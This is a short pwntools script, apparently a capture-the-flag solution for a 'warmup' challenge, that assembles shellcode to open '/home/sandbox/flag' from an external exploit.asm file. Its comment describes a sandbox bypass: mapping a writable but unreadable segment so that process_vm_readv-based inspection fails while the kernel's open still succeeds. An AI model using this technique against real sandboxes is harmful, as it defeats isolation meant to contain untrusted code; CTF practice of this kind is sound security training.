from pwn import *  # NOQA

''' use this as payload for warmup, the trick here was to mmap a segment
    not readable but writeable process_vm_readv will fail, but the kernel
    will still be able to read it and the open won't fail '''

with open('exploit.asm', 'r') as xxx:
    with open('sc.bin', 'w') as sc:
        shellcode = asm(pwnlib.shellcraft.i386.pushstr('/home/sandbox/flag'))
        shellcode += asm(xxx.read())
        sc.write(shellcode)
